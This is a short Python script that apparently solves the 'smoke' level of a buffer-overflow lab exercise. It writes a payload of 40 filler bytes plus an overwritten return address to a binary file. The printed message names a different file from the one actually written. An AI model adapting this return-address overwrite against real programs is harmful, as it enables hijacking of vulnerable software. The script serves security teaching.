import sys

smoke_addr = 0x40123a

payload = b'A' * 40
payload += smoke_addr.to_bytes(8, byteorder='little')

with open(r'./payload/smoke.bin', 'wb') as f:
    f.write(payload)

print("Payload written to payload.bin")